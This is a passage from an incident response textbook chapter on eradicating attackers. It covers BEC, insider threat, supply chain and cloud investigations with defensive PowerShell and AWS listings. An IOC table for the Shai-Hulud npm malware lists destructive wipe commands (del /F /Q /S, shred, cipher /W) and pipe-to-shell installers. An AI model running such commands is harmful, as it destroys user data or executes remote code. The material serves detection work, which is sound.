This dynamic analysis process is iterative. Each time analysts complete the basic workflow, they will learn

more about the malware. It is often necessary to repeat the dynamic analysis multiple times to obtain a

complete picture of the malware’s behavior.

Monitoring or instrumentation tools capture the malware’s behavior during execution.  For Windows

systems, Process Monitor from Sysinternals is a widely used tool for dynamic analysis. Analysts can

configure Process Monitor to capture detailed file system, registry, network, and process activity, using

filtering features to focus on the malware process and its children. The example in Figure 102 shows Process

Monitor capturing activity from a malware sample, revealing process execution for cmd.exe.

Figure 102 | Process Monitor Dynamic Analysis Example

Automated sandbox platforms also offer an alternative to manual dynamic analysis.  Online services like

Hybrid Analysis and Joe Sandbox execute samples in instrumented environments and produce detailed

behavioral reports. These platforms handle the isolation and monitoring complexity, providing reports that

enumerate file system changes, registry modifications, network connections, and process activity. For

known malware families, sandbox reports often provide sufficient detail to guide eradication without

requiring manual analysis.

Practical Limitations

Not all malware yields to basic analysis techniques. Recognizing when a sample exceeds the capabilities of

the incident response team and requires specialist assistance is important:

• Heavy obfuscation or packing: When string extraction reveals nothing readable and static analysis tools

show encrypted or compressed content, the malware authors have deliberately hidden functionality.

Unpacking requires specialized skills and tools.

• Anti-analysis techniques : Some malware detects virtual machines, debuggers, or sandbox

environments and either refuses to execute or behaves differently in them. If dynamic analysis produces

no activity, the sample may be evading the analysis environment.

• Kernel-mode rootkits : Malware operating at the kernel level requires specialized tools and kernel

debugging expertise.

• Cryptographic analysis : Advanced ransomware assessment to determine whether decryption is

possible often requires malware reverse engineering and cryptographic expertise.

When necessary, engage specialized malware analysis resources, whether internal security research teams,

managed security service providers, or external forensic consultants.

A combination of signals often tips the balance toward external help: the sample does not appear in

VirusTotal or other community repositories; static analysis reveals heavy packing or obfuscation; and the

in-house team is already struggling to make progress. Together, these three signals can suggest the

malware is not a commodity-level variant, and continuing to work the sample without a specialist retainer

can waste days of eradication time. Engaging retainer IR support early in this scenario is usually faster and

cheaper than doing so after several days of unsuccessful analysis.

The goal of malware analysis during eradication is to obtain insight for practical action. Focus analysis

efforts on answering specific questions: what does this malware create, where it persists, what needs to be

done to remove it, and how the findings can help scope other infected systems.

Business Email Compromise Investigation

Business Email Compromise (BEC) incidents involve attackers gaining access to or impersonating business

email accounts to commit financial fraud. Unlike malware-driven intrusions, BEC cases rarely involve

malicious executables or host-based persistence.  Instead, attackers rely on legitimate identity credentials

and built-in email features such as forwarding rules, OAuth app grants, legacy protocol access, and token

reuse.

BEC attacks have resulted in over $55 billion in losses since 2013, making them among the most financially

impactful cyber threats organizations face. [12]

Threat actors conduct extensive reconnaissance before

attacking, researching organizational structure, identifying employees with financial decision-making

authority, and studying communication patterns. Common targets include executives, attorneys,

accounting staff, and anyone authorized to initiate wire transfers or modify payment details. This

preparation allows attackers to craft convincing requests that exploit trust relationships and business

processes.

BEC incidents present unique eradication challenges because the most valuable investigative artifacts live in

cloud identity and email platforms rather than on endpoints. Initial access methods range from credential

phishing to OAuth token hijacking, and attackers with administrative access to email systems represent the

biggest threat. Administrative access allows attackers to create mail flow rules, forwarding configurations,

and other changes to email systems that execute fraudulent attack elements without any visibility on end-

user devices. Successful investigation requires that analysts understand the exploited access vectors, the

operational changes to mail delivery systems, and the enumeration of fraudulent transactions committed

during the attack.

Email System Investigation

When conducting a BEC investigation, analysts should examine mailbox rules and message forwarding

configurations on affected accounts. BEC attackers frequently create inbox rules that automatically forward

copies of incoming email to external addresses, delete messages from specific senders (particularly security

alerts or responses from fraud targets), or move messages to obscure folders where victims will not notice

them. These rules provide persistent access to communications even after the attacker’s initial access is

contained.

In Microsoft 365 systems, analysts can use PowerShell commands such as Get-InboxRule to enumerate all

Eradicate Activity | Chapter 13 | 309

inbox rules for affected accounts. The ForwardTo, DeleteMessage, and MoveToFolder attributes will reveal any

policy actions taken on inbound messages. The example in Listing 77 demonstrates how to list inbox rules

for a specific user account, revealing any rules that might indicate attacker persistence.

Listing 77 | Enumerating Inbox Rules for BEC Investigation

PS C:\> Get-InboxRule -Mailbox "jwalcott@falsimentis.com" | Select-Object Name, Description,

Enabled, ForwardTo, DeleteMessage, MoveToFolder | Format-List 1

Name          : Daily Reports

Description   : Move daily reports to Reports folder

Enabled       : True

ForwardTo     :

DeleteMessage : False

MoveToFolder  : Reports

Name          : auto-archive 2

Description   :

Enabled       : True

ForwardTo     : dxvpflrcdhquzyixdn@midnitemeerkats.com 3

DeleteMessage : True

MoveToFolder  :

1 Enumerate inbox rules for the CEO account.

2 Suspicious rule forwarding email externally and deleting the original message.

3 External forwarding address controlled by the attacker.

Examine organization-level mail flow and transport rules for incidents involving administrative access.

Sophisticated BEC attackers may create organization-wide rules that redirect specific messages, block

security notifications, or allow domains under their control to bypass inbound message controls.

SUBLIME EML ANALYZER: FREE AND POWERFUL EMAIL ANALYSIS TOOL

The Sublime EML Analyzer  is a free tool that parses raw (EML-formatted) email messages and

evaluates them against the Sublime Core Feed, a curated set of detection rules maintained by the

Sublime security research team. Analysts can upload a suspicious email message and receive

immediate analysis that identifies phishing indicators, spoofing techniques, malicious attachments,

and social engineering patterns without needing to manually inspect headers or decode message

content.

Figure 103 | Sublime EML Analyzer Message Analysis Sample

The value for incident responders is speed and coverage. Rather than manually reviewing email

headers for authentication failures or examining URLs one at a time, the EML Analyzer applies

hundreds of detection rules simultaneously and returns results organized by severity. During a BEC

investigation, this can quickly confirm whether a suspicious message matches known phishing

patterns, identify the specific techniques used to bypass email security controls, and provide

evidence for the investigation timeline.

Identity and Access Investigation

Review OAuth application permissions and third-party integrations for each affected account.  Modern BEC

attacks often involve OAuth consent phishing, in which victims grant malicious applications access via

OAuth consent flows. These applications maintain access to email even after password resets, making them

a persistent threat that password rotation alone will not resolve.

For Microsoft 365 environments, use Microsoft’s Get-AzureADPSPermissions.ps1 script to enumerate all

Eradicate Activity | Chapter 13 | 311

delegated permission grants across the tenant as shown in Listing 78. [13]

This script inventories delegated

permissions and application permissions, revealing which applications have access to user data and what

level of access they possess. The output CSV file lists all applications with granted permissions, allowing

analysts to identify any high-privilege applications that may have been authorized during the compromise

window.

Listing 78 | Enumerate Delegated Permissions in Microsoft Entra

PS C:\IR> .\Get-AzureADPSPermissions.ps1

Connecting to Microsoft Graph...

Retrieving OAuth2PermissionGrants...

Exporting results to .\Permissions.csv

PS C:\IR> Get-Item .\Permissions.csv

Directory: C:\IR

Mode                 LastWriteTime         Length Name

----                 -------------         ------ ----

-a---         11/28/2025  10:13 AM         24576 Permissions.csv

Listing 79 | Review Delegated Permissions in Microsoft Entra

PS C:\IR> Import-Csv .\Permissions.csv

[...]

TenantId           : 7f3e74e1-3855-4d44-a3db-5f3f9b37a1f9

UserDisplayName    : Lukas Dolman

UserPrincipalName  : ldolman@falsimentis.com

UserObjectId       : ecb20947-41fd-47c3-b27a-31c88a0e2a69

ClientAppId        : 7486f14b-2bc5-42f8-87bd-a2d1b5725db6

ClientName         : Power BI Reports Viewer

Permission         : Calendars.Read, Calendars.Read.Shared

ConsentType        : Principal

ConsentCreatedDate : 2024-05-09T16:22:54Z

TenantId           : 7f3e74e1-3855-4d44-a3db-5f3f9b37a1f9

UserDisplayName    : <tenant-wide>

UserPrincipalName  : <tenant-wide>

UserObjectId       : 00000000-0000-0000-0000-000000000000

ClientAppId        : 67c06044-2e2d-4cae-91e3-32ba827ac202

ClientName         : SecureSync Data Connector

Permission         : email, offline_access, Mail.ReadWrite, Mail.Send, Files.ReadWrite.All 1

ConsentType        : AllPrincipals

ConsentCreatedDate : 2025-11-26T03:41:09Z

1 Delegated permissions indicate a potential BEC persistence mechanism.

Look for applications with high-privilege permissions, such as email, Mail.ReadWrite, Mail.Send, or

MailboxSettings.ReadWrite that were granted during the compromise window. Applications with these

permissions can enumerate, read, send, and manage email without user interaction, making them effective

persistence mechanisms for BEC attackers.

Investigate delegated permissions and multi-mailbox access configurations. Attackers with access to one

compromised account often grant themselves additional permissions to access other mailboxes. Look for

recently added mailbox delegation permissions, particularly "Full Access" or "Send As" permissions that

allow one user to read another user’s email or send email on their behalf. These permissions persist

independently of password changes and require explicit revocation. For Microsoft 365 environments, use

Get-MailboxPermission and Get-RecipientPermission to identify all delegated access configurations across

affected accounts.

Financial Transaction Investigation

Another important element in a BEC investigation is to analyze financial transactions initiated during the

compromise window. These resources will vary significantly by environment and will require close

coordination with finance and accounting teams to identify relevant transactions.

Analyze authentication logs and sign-in patterns to establish the timeline of attacker access. Review sign-in

logs for suspicious patterns such as impossible travel (logins from geographically distant locations within

short time periods), sign-ins from unusual locations or IP addresses, or multiple accounts accessed from the

same IP address. This analysis helps identify the scope of compromise and any additional accounts requiring

investigation.

In Microsoft 365 environments, export sign-in logs from the Entra admin center and analyze location

patterns using PowerShell. The script in Listing 80  parses exported sign-in logs and displays each

authentication event with timestamp and location, sorted by user and time.

Listing 80 | Analyzing Sign-In Locations from Exported Logs

PS C:\IR> $signins = Get-Content .\SignInLogs.json | ConvertFrom-Json

PS C:\IR> $signins | Select-Object userPrincipalName, createdDateTime,

@{Name='Location';Expression={"$($.location.city), $($.location.state)"}}, 1

ipAddress | Sort-Object userPrincipalName, createdDateTime | Format-Table

userPrincipalName       createdDateTime        Location          ipAddress

-----------------       ---------------        --------          ---------

ldolman@falsimentis.com 11/26/2025 3:35:25 AM  Ashburn, Virginia 44.206.5.255

ldolman@falsimentis.com 11/26/2025 3:37:10 AM  Ashburn, Virginia 3.216.143.186

ldolman@falsimentis.com 11/26/2025 3:38:14 AM  Columbus, Ohio    3.12.218.40 2

ldolman@falsimentis.com 11/26/2025 3:39:18 AM  Ashburn, Virginia 44.220.31.71

ldolman@falsimentis.com 11/26/2025 3:40:22 AM  Columbus, Ohio    3.145.230.62

[...]

1 Calculated property combines city and state into a single Location column.

2 Sign-ins alternating between Virginia and Ohio within minutes indicate an impossible travel scenario.

The output in Analyzing Sign-In Locations from Exported Logs reveals an impossible travel pattern: the user

ldolman@falsimentis.com authenticated from both Ashburn, Virginia, and Columbus, Ohio, within a five-

minute window. Since these locations are approximately 300 miles (482 kilometers) apart, physical travel

between them in one minute is impossible. This pattern strongly suggests credential compromise, with the

legitimate user signing in from one location while an attacker uses stolen credentials from another.

Eradicate Activity | Chapter 13 | 313

Coordinate with finance and accounting teams to trace any fraudulent transactions initiated during the

compromise window. BEC attackers often monitor email traffic for weeks before striking during major

payment periods, or end-of-quarter rushes when workload may increase the likelihood of a successful

attack. Review wire transfer requests, invoice payments, and vendor payment modifications that occurred

during the identified compromise period.

Victim by Proxy

Not every BEC incident involves a compromise of the victim organization’s own email or identity systems. In

a common variant, a supplier’s mailbox is compromised, the attacker inserts messages into an established

payment thread, and the victim pays a fraudulent account in good faith. The organization typically becomes

aware only when the real supplier chases the unpaid invoice days or weeks later, as shown in Figure 104.

Figure 104 | Victim-by-Proxy BEC Scenario

Investigation in this scenario is constrained by the artifacts the victim actually has. The victim’s own mail

flow, identity logs, and endpoints show no compromise because there was none. The evidence available is

the email that arrived in the victim’s inbox, the payment records in the accounts payable system, and

whatever the supplier is willing to share about its own incident. In this scenario, the IRT can focus the

investigation on three areas:

• Email header and content analysis : Examine the headers of the messages that instructed the payment

change. Compare the sending domain to the supplier’s legitimate domain for lookalike substitutions (for

example, wehost4every1.com versus wehost4evrey1.com), and check for reply-to addresses that diverge

from the From address.

• Domain registration timing : Query WHOIS for the apparent sender’s domain. A lookalike domain

registered days or weeks before the first suspicious email is a strong indicator of a staged BEC attack

rather than a legitimate communication. The same check on the victim organization’s own domain

sometimes reveals that the attacker also registered a lookalike of it, typically after extracting payment,

to intercept the supplier’s follow-up messages and delay discovery.

• Information flow analysis : Check whether the attacker introduced new information or only replayed

information the victim had already sent. An attacker operating from a compromised thread often can

only mirror the victim’s own details with plausible filler between them, while a legitimate supplier

typically provides new details such as invoice numbers or payment confirmations the victim has not

seen.

When the compromise is on the supplier’s own email server rather than a lookalike domain,

fraudulent messages share the same technical fingerprint as legitimate ones: identical

sending mail server, matching SPF and DKIM results, consistent user agent, and consistent

message headers. The victim organization has no technical basis to differentiate attacker-

initiated messages from genuine supplier email. As the victim-by-proxy organization, use

that technical consistency when communicating with the supplier’s security team:

messages that pass every authentication check from the supplier’s own infrastructure are

themselves evidence the compromise sits on the supplier’s side, supporting the case to

advocate a thorough investigation on their end.

Coordinate with the supplier’s security team if they engage. Remote organizations are often reluctant to

acknowledge fault in a BEC incident, particularly when commercial liability is in dispute, so the victim

organization should not wait on supplier cooperation before taking recovery action.  Involve law

enforcement and the receiving bank promptly. Funds recovery rates drop sharply after the first seventy-two

hours as attackers cash out through layered transfers, and formal requests to freeze or reverse a wire often

need legal authority beyond the victim organization.

Insider Threat Investigation

Insider threat incidents require a different investigative approach than external attacks because the subject

has authorized access to systems and data. This makes distinguishing malicious activity from authorized

actions more challenging, requiring careful analysis of access patterns, timing, and context. The

investigation focuses on understanding the scope of unauthorized activity to enable comprehensive removal

of access and the restoration of business operations.

Before beginning investigation activities, the incident response team should coordinate closely with human

resources, legal, and company leadership. Insider threat investigations carry significant legal implications,

and improper handling of evidence or premature disclosure can compromise both the technical response

and potential legal action. Responders should understand which evidence should be preserved, which

actions require legal approval, and which information can be shared with stakeholders.

The access granted to an insider, along with the knowledge they possess of internal

systems and processes, can enable sophisticated evasion techniques. Responders should

coordinate closely with HR, legal, and leadership to ensure the investigation proceeds

appropriately.

Eradicate Activity | Chapter 13 | 315

Investigation should focus on three primary areas: data access patterns, privilege changes, and exfiltration

methods. Review pertinent data access logs, application access logs, and cloud storage records to identify

which data the insider accessed and whether they downloaded or transferred information outside normal

business patterns. Examine recent changes to user accounts, group memberships, and permission

assignments that may indicate privilege escalation. Analyze email logs, cloud storage uploads, USB device

connections, and any data leakage alerts to understand how data may have left the environment.

Technically sophisticated insiders may create persistence mechanisms to maintain access after their

primary credentials are revoked. Look for remote access tools, secondary accounts, or modified system

configurations that could allow continued access. Understanding these mechanisms during investigation

ensures that subsequent eradication actions address all access paths.

Document all investigation findings meticulously, as insider threat cases frequently result in legal

proceedings. Maintain detailed records of the insider’s access, the unauthorized activities discovered, and

the data accessed or exfiltrated. Work closely with legal counsel throughout the investigation to ensure that

evidence collection aligns with legal requirements and supports the organization’s goals in responding to

the threat.

INSIDER THREAT FROM DAY ONE: KNOWBE4’S NORTH KOREAN IT WORKER

In July 2024, security awareness training company KnowBe4 discovered it had hired a North Korean

threat actor posing as a remote IT worker. [14]

The attacker passed four video interviews using an AI-

enhanced photograph derived from a stock image (as shown in Figure 105 ), cleared background

checks using a stolen U.S. identity, and provided verified references prior to hire.

Figure 105 | Stock Photo (Left) and AI Fake (Right) Used by North Korean Threat Actor

Upon receiving a company-issued workstation sent to a U.S. address, an accomplice connected the

laptop to a Raspberry Pi device, extending access to the North Korean threat actor’s location. The

threat actor used the laptop remotely, working overnight to simulate normal business hours in the

U.S. Shortly thereafter, the KnowBe4 SOC detected unusual activity from the new hire’s account.

“On July 15, 2024, a series of suspicious activities was detected on the user beginning at 9:55pm EST

(sic; July 15 is EDT ). When these alerts came in KnowBe4’s SOC team reached out to the user to

inquire about the anomalous activity and possible cause. XXXX responded to SOC that he was

following steps on his router guide to troubleshoot a speed issue and that it may have caused a

compromise.

Following additional suspicious behavior, including manipulated session history data, harmful file

transfers, and attempts to execute unauthorized software, the KnowBe4 SOC terminated the

employee’s access and began a full investigation. The investigation revealed that no company data

was compromised due to KnowBe4’s restricted system and data access policies for new employees,

which prevented the attacker from accessing sensitive systems. Further, the quick actions to identify

and contain the insider threat limited the attacker’s ability to establish deeper persistence in the

KnowBe4 environment.

This incident demonstrates that insider threats can begin on day one of employment. It highlights the

value of KnowBe4 defense-in-depth controls to limit insider threats from new hires, including least-

privilege access, robust monitoring, and rapid incident response.

Supplier and Supply Chain Investigation

Supply chain compromises present unique eradication challenges because the malicious code or access

often arrives through trusted channels and legitimate update mechanisms. When a supplier or partner

organization is compromised, the attacker gains access to multiple downstream organizations

simultaneously, and eradication requires not only removing the attacker’s artifacts from the environment

but also understanding the scope of the supply chain compromise across the broader ecosystem.

Supply chain attacks fall into four broad categories, each requiring different investigation and eradication

approaches:

• Hardware supply chain attacks, in which physical devices are modified during manufacturing, shipping,

or maintenance.

• Software supply chain compromises, in which software the organization runs in its own environment is

poisoned upstream from software vendors or open-source projects.

• SaaS vendor compromises, in which a vendor runs the software and the organization places its data on

the vendor’s platform.

• Managed service provider and staff access compromises , in which a vendor’s staff or expertise is

provided to the organization with legitimate access to its environment.

The sections that follow examine each of these threat categories in more detail.

Software Supply Chain Compromises

Software supply chain compromises affect software that the organization runs in its own environment,

where an upstream vendor’s product or package has been poisoned and reaches the environment through

normal update or distribution channels. These compromises split into two sub-types that often call for

different investigation paths.

Eradicate Activity | Chapter 13 | 317

Boundary software : These products operate at the network edge: firewalls, VPN concentrators, remote

access gateways, and similar edge appliances. A compromise exposes the organization’s full internal

network to an attacker holding a privileged vantage point, and detection is complicated because the

compromised device is often the same device the organization relies on for security controls.

Internal software: Libraries, data center appliances, internal applications, and developer toolchains all run

inside the organization’s systems. A compromise here typically requires the attacker to traverse the

environment laterally to reach high-value targets, but the breadth of internal software and its dependencies

(captured by supply chain risks such as the Apache Log4j vulnerability) makes the search surface large.

When attackers compromise software vendors and inject malicious code into legitimate software updates,

the resulting compromises appear to come from trusted sources and may bypass security controls that

would normally detect malicious activity. In a software-based supply chain compromise, start by identifying

all systems that installed the compromised software version. Review software deployment logs, package

manager histories, and endpoint management systems to build a comprehensive list of affected systems.

This scope may extend beyond initially identified systems due to the pervasive nature of supply chain

attacks.

Analyze the malicious code to understand its capabilities and artifacts. Work with the software vendor to

obtain information about indicators of compromise specific to the compromised version. Since supply chain

incidents can affect so many end users, security researchers and the incident response community often

share IOCs for major supply chain incidents shortly after identification.

For example, a 2025 supply chain attack discovered by GitLab’s Vulnerability Research Team identified

multiple compromised Node Package Manager (NPM) packages with a worm-like propagation mechanism to

distribute the Shai-Hulud malware. [15]

In their assessment of the incident, GitLab researchers shared

multiple IOCs to identify the malicious artifacts created by the compromised NPM packages, as shown in

Table 26.

Table 26 | GitLab NPM Supply Chain Compromise IOCs

TYPE INDICATOR DESCRIPTION

File bun_environment.js Malicious post-install script in node_modules

directories

Directory .truffler-cache/ Hidden directory created in user home for

Trufflehog binary storage

Directory .truffler-cache/extract/ Temporary directory used for binary

extraction

File .truffler-cache/trufflehog Downloaded Trufflehog binary (Linux/Mac)

File .truffler-cache/trufflehog.exe Downloaded Trufflehog binary (Windows)

Process del /F /Q /S "%USERPROFILE%`" Windows destructive payload command

Process shred -uvz -n 1 Linux/Mac destructive payload command

Process cipher /W:%USERPROFILE% Windows secure deletion command in

payload

TYPE INDICATOR DESCRIPTION

Command curl -fsSL https://bun.sh/install

| bash

Suspicious Bun installation during NPM

package install

Command powershell -c "irm

bun.sh/install.ps1|iex"

Windows Bun installation via PowerShell

Use threat intelligence platforms and malware analysis tools to gather IOCs related to the

specific supply chain compromise to support more comprehensive investigation efforts.

Supply chain malware is often designed to meet specific goals such as committing financial fraud (including

decentralized finance/cryptocurrency theft), gaining persistence on compromised endpoints, exfiltrating

data, or conducting hacktivist campaigns. Examine the affected software elements to identify the possible

goals of the attack and guide subsequent assessment. For example, if malware distributed through a supply

chain compromise includes functionality to establish persistence or facilitate remote access, analysts should

investigate whether the compromised software was used to move laterally within the environment.

Sophisticated supply chain attacks will use the initial compromise as a foothold for further activity. Review

logs from affected systems for signs of lateral movement, credential dumping, or deployment of additional

tools. The scope of eradication may extend well beyond removing the compromised software if the attacker

used it to establish additional persistence.

VENDOR BREACH ACCOUNTABILITY: MARQUIS V. SONICWALL

When a vendor compromise leads to a downstream customer breach, the question of legal

accountability becomes significant. A growing number of organizations are pursuing litigation against

their security product and service vendors, shifting breach-related lawsuits from the traditional

consumer-to-company direction toward enterprise-to-vendor claims.

In August 2025, ransomware actors breached Marquis, a fintech company providing marketing and

compliance solutions to more than 700 banks and credit unions. The attack exposed Personally

Identifiable Information (PII) belonging to customers of Marquis’s clients. A month later, Marquis’s

firewall vendor, SonicWall, disclosed that it had suffered a breach, with attackers stealing customer

firewall configuration files from its cloud backup service. SonicWall initially claimed only 5% of

customers were affected, then revised that figure to 100%. [16]

Marquis filed suit against SonicWall in February 2026, alleging that SonicWall’s delayed and

incomplete disclosure prevented Marquis from mitigating the harm to its customers. According to

Marquis, SonicWall assured them that their firewall protection was unaffected for several weeks after

the compromise (presumably under the initial 95% unaffected group). Marquis alleges that SonicWall’s

failure to disclose the full scope of the breach in a timely manner allowed attackers to continue

exploiting the compromised firewalls, leading to the downstream breach at Marquis.

This case is part of a broader trend. In 2018, a breach at email security vendor Barracuda Networks

exposed personal health information from one of its clients, Zoll Services, leading to a lawsuit that

ultimately favored Barracuda. The 2023 MOVEit breach (see Modern Breach Complexity: The MOVEit

Supply Chain Attack) sparked dozens of lawsuits against the vendor, many of which remain pending.

As organizations strengthen their own defenses, the legal exposure for security vendors whose

Eradicate Activity | Chapter 13 | 319

products or services fail is increasing.

For incident response teams, these developments reinforce the importance of documenting vendor

interactions during an incident, particularly around disclosure timelines and the accuracy of vendor

communications about impact scope. Organizations should also review vendor contracts to confirm

they include notification requirements, indemnification clauses that hold the vendor accountable for

losses caused by their products or services, and clear accountability for security failures.

Hardware Supply Chain Attacks

Hardware supply chain compromises involve physical modifications to devices during manufacturing,

shipping, or maintenance. These attacks are rare but extremely difficult to detect and eradicate. Indicators

include unexpected firmware modifications, unauthorized hardware components, or unusual device

behavior that cannot be explained by software analysis.

Physical hardware modifications cannot be remedied by software and typically require hardware

replacement. Conduct a thorough inspection of suspicious devices to identify unauthorized chips, modified

firmware, or unexpected network behavior at the hardware level.

Document all serial numbers, procurement sources, and shipping chains for affected hardware. This

information helps determine the scope of potential compromise and whether other devices from the same

batch or supplier may be affected. Coordinate with hardware vendors and law enforcement, as hardware

supply chain attacks often have broader implications beyond a single organization.

COUNTERFEIT CISCO EQUIPMENT IN MILITARY SYSTEMS

In 2024, the U.S. Department of Justice sentenced the operator of a decade-long counterfeit

networking equipment scheme to more than six years in prison. [17]

The scheme imported tens of

thousands of low-quality network devices from China and Hong Kong, applied counterfeit Cisco

labels and packaging, and then sold them through Amazon and eBay storefronts, making over $100

million in revenue.

The counterfeit equipment ended up in hospitals, schools, government agencies, and military

systems, including platforms supporting U.S. fighter jets and aircraft flight simulators. Security

researchers including F-Secure Labs who analyzed similar counterfeit Cisco switches found hardware

implants (as shown in Figure 106) designed to bypass the device’s Secure Boot protections, allowing

modified firmware to run without detection. [18]

Figure 106 | Counterfeit Cisco WS-2960X-48TS-L V01 Switch with Hardware Modification

This case illustrates the investigative challenges posed by hardware supply chain attacks. Attackers

placed hardware implants inside network infrastructure devices, then injected them into corporate

and government procurement channels. Unlike software compromises, which forensic analysis can

identify, hardware implants may not contain obvious backdoors. Analysis reports for these

counterfeit devices indicate that the implanted hardware existed solely to bypass authentication

checks and run pirated software to avoid detection as counterfeit devices. However, the same

techniques could just as easily enable persistent backdoor access that survives firmware updates and

factory resets.

SaaS Vendor Compromises

SaaS vendor compromises occur when a vendor runs software on behalf of the organization and stores the

organization’s data on that platform. The organization’s own environment remains intact, but its data,

authentication tokens, or integrations hosted by the vendor are exposed through the vendor’s compromise.

Eradication focuses on cutting off data flows, rotating credentials stored at the vendor, and auditing

downstream systems that trusted tokens issued through the compromised integration.

Start by enumerating what data and credentials the organization shared with or stored on the compromised

vendor. Many SaaS integrations maintain OAuth tokens, API keys, or service credentials on the vendor’s

platform so that the vendor can act on the organization’s behalf, and a compromise of the vendor exposes

all of those credentials simultaneously.

Work with the vendor to obtain compromise timelines and specific IOCs, then check the organization’s own

logs for abuse of any credential that was stored at the vendor: API calls from unexpected sources, token

refreshes outside normal business hours, and data access patterns that suggest automated enumeration. In

Eradicate Activity | Chapter 13 | 321

incidents where the partner reports evidence of specific data exposure, enumerate the disclosed data to

identify what information may have been affected, and leverage non-disclosure agreements as needed to

collect detailed information from the partner to assess risk and impact.

SUPPLY CHAIN COMPROMISE: THE SALESLOFT DRIFT INCIDENT

Drift is a conversational marketing platform that provides AI-powered chatbots for business websites.

When visitors land on a company’s website, Drift engages them through automated chat, qualifies

leads, answers questions, and routes high-intent prospects to human sales representatives. The

platform supports over fifty third-party integrations, including Salesforce, Slack, HubSpot, Zendesk,

GitHub, Google Workspace, and others. [19]

In August 2025, attackers compromised Salesloft’s Drift platform and stole OAuth tokens that

provided access to customer environments. Using a single stolen Salesloft token, the threat actor

could access tokens for any organization that had linked Drift to its systems. Google Threat

Intelligence identified over 700 potentially impacted organizations whose connected platforms were

exposed through this single point of compromise. [20]

The attackers systematically exploited this access to query integrated platforms for sensitive data.

They extracted customer records, sales opportunities, and support cases from Salesforce instances.

More significantly, they harvested credentials stored within these systems: AWS access keys, VPN

credentials, Snowflake tokens, and other secrets that organizations had stored in connected

platforms. These stolen credentials opened doors to yet more systems, creating a cascading

compromise that extended far beyond the original Drift integration.

“Google warns the breach goes far beyond access to Salesforce data, noting the hackers responsible

also stole valid authentication tokens for hundreds of online services that customers can integrate

with Salesloft, including Slack, Google Workspace, Amazon S3, Microsoft Azure, and OpenAI. [21]

— Brian Krebs, Krebs on Security

On August 20, 2025, Salesloft and Salesforce revoked all active access and refresh tokens, and

Salesforce removed Drift from their partner marketplace. Organizations affected by this compromise

faced eradication challenges extending across every system that had integrated with Drift. They

needed to identify which credentials were stored on connected platforms, rotate all potentially

exposed secrets, audit downstream systems such as AWS and Azure for unauthorized access, and

monitor for extortion attempts using harvested data.

The Drift incident illustrates how modern supply chain compromises cascade through

interconnected systems. A single compromised service provider exposed not only its own data but

also authentication materials that unlocked access to dozens of other platforms, which in turn

contained credentials for yet more infrastructure. Each layer of integration amplified the blast radius

of the original breach.

On the remediation side, rotate all credentials that the organization stored with the vendor, revoke OAuth

grants the vendor held to the organization’s systems, and coordinate with the vendor on removing the

organization’s data from the compromised environment if the data can no longer safely reside there.

Managed Service Provider and Staff Access Compromises

Managed service provider and staff access compromises occur when a vendor provides personnel or

expertise to the organization with legitimate access to its environment. Examples include IT outsourcing

arrangements, in which vendor staff operate inside the organization’s network under their own or shared

accounts, and specialist engagements in which a vendor’s consultants hold administrative credentials for a

bounded project. A compromise of the vendor’s own environment, or of the vendor’s identity infrastructure,

becomes a compromise of the access that vendor holds to the organization.

When responding to this type of compromise, start by identifying all access points the vendor has into the

environment, including VPN connections, API integrations, federated authentication, and shared

infrastructure. Review authentication logs for all accounts associated with the vendor and its staff. Look for

unusual access patterns, access from unexpected locations, or access during timeframes when the vendor

was known to be compromised.

Rotate credentials and tokens the vendor holds for the organization before declaring eradication complete.

Depending on the access model, rotation may require re-provisioning accounts, re-issuing tokens, and re-

establishing federation trust with the vendor’s identity provider.

Coordinate with the compromised supplier or partner throughout the eradication process regardless of

which category applies. They may have valuable information about the attacker’s capabilities, IOCs specific

to the compromise, and the timeline of malicious activity. When possible, share information about what the

investigation uncovers, as these findings may help the supplier understand the broader impact of their

compromise.

Cloud Investigation

Cloud environments introduce investigation and eradication challenges that depart from the procedures of

traditional on-premises infrastructure. The ephemeral nature of cloud resources, the prevalence of

infrastructure-as-code, and the complex identity and access management systems require different

approaches to understanding and removing the presence of attackers.

Cloud incidents typically fall into two main categories requiring distinct eradication techniques:

Infrastructure-as-a-Service (IaaS) compromises involving virtual machines, containers, and storage, and

Software-as-a-Service (SaaS) compromises involving cloud applications, OAuth tokens, and API abuse.

IaaS Investigation and Eradication

Infrastructure-as-a-Service compromises present two distinct attack surfaces that require different

investigative approaches: the cloud control plane and the infrastructure itself. Understanding this

distinction helps structure a thorough investigation before removing the attacker’s access.

Cloud Control Plane Investigation

The cloud control plane encompasses all the management APIs, IAM systems, and configuration services

that govern how cloud resources are created, modified, and accessed. Attackers who compromise control

plane access can create new resources, modify security configurations, and establish persistence

mechanisms that survive infrastructure rebuilds.

Control plane investigation relies primarily on log analysis and differential analysis.  Review cloud provider

audit logs (AWS CloudTrail, Azure Activity Log, GCP Cloud Audit Logs) to identify all API calls made during

the compromise timeframe. Look for resource creation, IAM modifications, security group changes, and any

Eradicate Activity | Chapter 13 | 323

actions that could establish persistence or expand access.

Differential analysis compares the current environment against a known-good baseline (see the sidebar

Differential Analysis for Threat Investigation ). Organizations using Infrastructure-as-Code (IaC) tools like

Terraform, CloudFormation, or Pulumi can compare the deployed state against their source-controlled

definitions to identify unauthorized changes. For environments without IaC, compare against documented

architecture diagrams, previous configuration exports, or pristine reference environments. Pay particular

attention to IAM policies, assume-role trust relationships, security groups, and resource configurations that

differ from expected baselines.

Investigate IAM thoroughly. Attackers frequently create new roles, modify existing policies, or add

themselves to privileged groups.  Examine assume-role policies that allow cross-account access, as

attackers may use compromised credentials to pivot to other AWS accounts or Azure subscriptions. For

example, the AWS IAM enumeration example in Listing 81  lists all IAM roles with sts:AssumeRole

permissions, revealing roles that can be assumed by other principals including an external AWS account

identified as 013628954028.

Listing 81 | Enumerate AWS IAM Roles with AssumeRole Permissions

$ aws iam list-roles | jq -r '

.Roles[]

| .RoleName as $r

| .AssumeRolePolicyDocument.Statement[]

| select(.Effect=="Allow" and (.Action|tostring|contains("sts:AssumeRole")))

| ($r), (.Principal | tojson), ""' 1

[...]

aws-elasticbeanstalk-ec2-role

{"Service":"ec2.amazonaws.com"}

survivorBingo-role-jv27lw38

{"Service":"lambda.amazonaws.com"}

survivorBingo-role-jv27lw38

{"AWS":"arn:aws:iam::013628954028:root"} 2

1 Prints each IAM role followed by the principals allowed to assume it.

2 The role can be assumed by an external root account with AWS account ID 013628954028.

Each cloud provider has different mechanisms for cross-account or cross-tenant trust relationships. Table

27 summarizes equivalent commands for investigating role and permission assignments across providers.

Table 27 | Cloud Role and Trust Enumeration Quick Reference

List role assignments and permissions

